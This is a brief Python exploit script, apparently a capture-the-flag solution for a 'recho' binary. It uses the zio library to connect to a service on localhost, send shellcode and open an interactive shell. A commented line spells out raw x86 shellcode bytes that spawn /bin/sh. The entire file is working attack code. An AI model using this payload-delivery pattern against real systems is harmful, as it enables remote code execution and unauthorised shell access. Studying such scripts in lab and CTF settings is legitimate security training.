from zio import *
from shellcode import shellcode

# io = zio('./recho/recho')            # used for local pwning development
io = zio(('localhost', 1234))

# shellcode = '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

# io.write(shellcode + '\0')
io.write(shellcode)

# hey, we got an interactive shell!
io.interact()